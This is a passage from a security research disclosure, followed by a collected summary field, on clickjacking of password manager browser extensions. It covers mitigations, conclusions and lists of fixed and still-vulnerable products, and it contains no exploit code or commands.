Firefox.\nChromium-based browsers:\nExtension settings \u2192 site access \u2192 \"on click\"\nWith this setting, the browser extension will not access the site. The user can temporarily grant access by clicking on the extension icon in the upper right corner.\nConclusion\nClickjacking is not dead - browser extensions are vulnerable to clickjacking\n\u2192 iframe-based and especially to the DOM-based\nMalicious script can be on any trusted website (XSS, subdomain takeover, web cache poisoning...).\nXSS is not RCE, attackers can find (easily) this vulnerability.\n\u26a0\ufe0f 1 click = attacker gets your credentials incl. TOTP (only for vulnerable domain)\nNo vulnerability is needed to leak your credit card, personal data\n\u26a0\ufe0f 1 click = credit cards details or personal data (attacker\u2019s website)\n\u26a0\ufe0f 2 clicks = credit cards details + personal data (attacker\u2019s website)\nFixed: NordPass, ProtonPass, RoboForm, Dashlane, Keeper\nStill vulnerable: Bitwarden, 1Password, iCloud Passwords, Enpass, LastPass, LogMeOnce\nResearch on only 11 password managers\nothers DOM-manipulating extensions will be vulnerable (password managers, crypto wallets, notes etc. )\n2FA should be strictly separated from login credentials - when storing everything in one place, so the attacker could exploit vulnerable password managers and gain access to the account even with 2FA enabled."

  "argos_summary": "The article details a high\u2011severity DOM\u2011based extension clickjacking vulnerability that allows attackers to steal stored credentials, credit card details, personal data, and even TOTP or passkey assertions from vulnerable password manager browser extensions with as few as one or two user clicks. The attack works by overlaying invisible or semi\u2011transparent elements that mimic cookie or dialog prompts, tricking users into clicking while the extension\u2019s autofill UI is hidden. It can be executed on any trusted site via XSS or similar vulnerabilities, and exploits subdomain autofill behavior common to many managers. The research covers 11 password managers, with fixed versions for NordPass, ProtonPass, RoboForm, Dashlane, and Keeper, while Bitwarden, 1Password, iCloud Passwords, Enpass, LastPass, and LogMeOnce remain vulnerable. Mitigations include disabling manual autofill, restricting site access to \u201con click,\u201d and developers patching style changes, closed shadow roots, and overlay detection. Users should keep extensions updated, disable manual autofill if possible, and limit autofill to exact URLs. The vulnerability demonstrates that clickjacking via extensions is still a real threat, capable of compromising accounts even with 2FA if credentials and TOTP are stored together.",
